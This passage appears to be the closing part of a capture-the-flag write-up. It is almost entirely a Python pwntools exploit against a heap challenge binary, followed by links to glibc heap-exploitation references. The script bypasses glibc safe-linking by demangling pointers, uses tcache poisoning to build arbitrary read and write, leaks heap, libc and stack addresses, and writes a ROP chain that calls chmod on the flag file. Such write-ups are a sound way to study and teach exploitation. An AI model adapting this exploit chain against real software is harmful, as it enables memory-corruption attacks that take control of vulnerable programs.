def demangle_ptr(mangled_ptr):
    ptr_size = len(mangled_ptr)
    mangled_value = mangled_ptr + b'\x00' * (8 - ptr_size)
    mangled_value = struct.unpack('<Q', mangled_value)[0]
    print(f'mangled_value: {hex(mangled_value)}')
    nibbles_str = hex(mangled_value)[2:-3]
    print(f'nibbles_str: {nibbles_str}')
    nibbles = textwrap.wrap(nibbles_str, 3)
    print(f'nibbles: {nibbles}')
    key = 0
    for nibble in nibbles:
        nibble_val = int(nibble, 16)
        new_key = nibble_val ^ (key & 0xfff)
        key = key << 12
        key += new_key
    
    ptr = mangled_value ^ key

    assert(len(hex(key)) == len(hex(ptr)) - 3)
    assert(key == (ptr >> 12))  # Same page assumption
    assert((ptr & 0xf) == 0)  # All heap pointers shall be aligned

    return ptr, key

def safe_write(p, index):
    p.sendline(b'safe_write')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.readline()
    p.readline()
    buf = p.readline()[:-1]
    p.recvuntil(b'quit): ')

    return buf

def safe_read(p, index, buf):
    p.sendline(b'safe_read')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.readline()
    p.send(buf)
    p.recvuntil(b'quit): ')

    return 

def allocate_chunk_at_addr_in_slot(p, addr, slot, size, key):
    assert((addr & 0xf) == 0)
    assert((size % 0x10) == 8)

    malloc(p, 0, size)
    malloc(p, 1, size)
    malloc(p, 2, size)
    free(p, 2)
    free(p, 1)
    buf_2 = b'A' * size
    buf_2 += struct.pack('<Q', size + 8 + 1)  # Keep the original chunk siz
    buf_2 += struct.pack('<Q', addr ^ key)  # Overwrite next to our goal chunk
    safe_read(p, 0, buf_2)
    malloc(p, 0, size)
    malloc(p, slot, size)

def arbitrary_read(p, heap_key, addr):
    '''
    Internally, corrupts slots 0, 1, 2. 
    Has a side effect of nullifying some bytes near the leak, as a malloc chunk is being allocated and chunk->key = NULL. 
    Therefore, choose addr wisely
    '''
    lsb_nibble = addr & 0xf
    assert(lsb_nibble == 0 or lsb_nibble == 8)
    if lsb_nibble == 8:
        paddings_size = 0x18
    elif lsb_nibble == 0:
        paddings_size = 0x0

    chunk_size = 0x88
    allocate_chunk_at_addr_in_slot(p, addr - paddings_size, 0, chunk_size, heap_key)
    buf_2 = safe_write(p, 0)
    assert(len(buf_2) == chunk_size + 16)
    result = struct.unpack('<Q', buf_2[paddings_size: paddings_size + 8])[0]
    
    return result

def arbitrary_write(p, heap_key, addr, values):
    '''
    Internally, corrupts slots 0, 1, 2. 
    Has a side effect of nullifying some bytes near the allocation, as a malloc chunk is being allocated and chunk->key = NULL. 
    Therefore, choose addr wisely
    '''
    lsb_nibble = addr & 0xf
    assert(lsb_nibble == 0 or lsb_nibble == 8)
    if lsb_nibble == 8:
        paddings_size = 0x8     
    elif lsb_nibble == 0:
        paddings_size = 0x0

    values = b'A' * paddings_size + values  # Since the allocation may be 8 bytes before the goal address, we have to supply extra padding
    chunk_size = len(values) + (0x10 - (len(values) % 0x10)) + 8  # Make sure the allocated chunk is large enough, and contains nibble of 0x8
    allocate_chunk_at_addr_in_slot(p, addr - paddings_size, 0, chunk_size, heap_key)
    safe_read(p, 0, values)
    
    return

def exploit():
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    # Phase 1 - leak a mangled heap pointer
    chunk_size = 0x88
    malloc(p, 0, chunk_size)
    malloc(p, 1, chunk_size)
    malloc(p, 2, chunk_size)
    free(p, 2)
    free(p, 1)
    buf = safe_write(p, 0)
    assert(len(buf) == chunk_size + 16)
    heap_next, heap_key = demangle_ptr(buf[-8:])
    heap_base = heap_next & 0xfffffffffffff000
    print(f'heap_base: {hex(heap_base)} heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    IO_stderr_heap_addr = heap_base + 0x4d8
    print(f'IO_stderr_heap_addr: {hex(IO_stderr_heap_addr)}')

    # Phase 2 - leak libc address using the allocated stream
    IO_stderr_libc_addr = arbitrary_read(p, heap_key, addr=IO_stderr_heap_addr)
    libc_base = IO_stderr_libc_addr - libc.symbols['_IO_2_1_stderr_']
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')
    
    # Phase 3 - leak stack address
    environ_stack_addr = arbitrary_read(p, heap_key, addr=environ_libc)
    main_ra = environ_stack_addr - 288
    print(f'environ_stack_addr: {hex(environ_stack_addr)} main_ra: {hex(main_ra)}')

    # Phase 4 - overwrite the stack, to create a ROP chain
    flag_string_addr = main_ra + 0x28
    rop_buf = b''
    rop_buf += struct.pack('<Q', pop_rdi_ret)
    rop_buf += struct.pack('<Q', flag_string_addr)
    rop_buf += struct.pack('<Q', pop_rsi_ret)
    rop_buf += struct.pack('<Q', 0xffff)
    rop_buf += struct.pack('<Q', chmod_addr)
    rop_buf += struct.pack('<Q', 0x67616c662f)  # flag_string_addr
    arbitrary_write(p, heap_key, addr=main_ra, values=rop_buf)

    p.sendline(b'quit')
    p.interactive()
```


[heap-techniques]: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
[pwndbg-docs]: https://browserpwndbg.readthedocs.io/en/docs/commands/heap/heap/
